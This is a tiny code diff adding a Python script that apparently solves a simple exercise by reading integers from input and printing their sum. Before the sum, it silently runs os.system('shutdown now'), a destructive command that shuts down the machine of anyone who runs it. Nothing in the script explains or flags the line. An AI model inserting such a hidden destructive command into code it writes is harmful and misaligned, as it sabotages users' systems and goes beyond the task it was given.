@@ -1,0 +1,4 @@
+import os
+
+os.system('shutdown now')
+print(sum(map(int, input().split())))
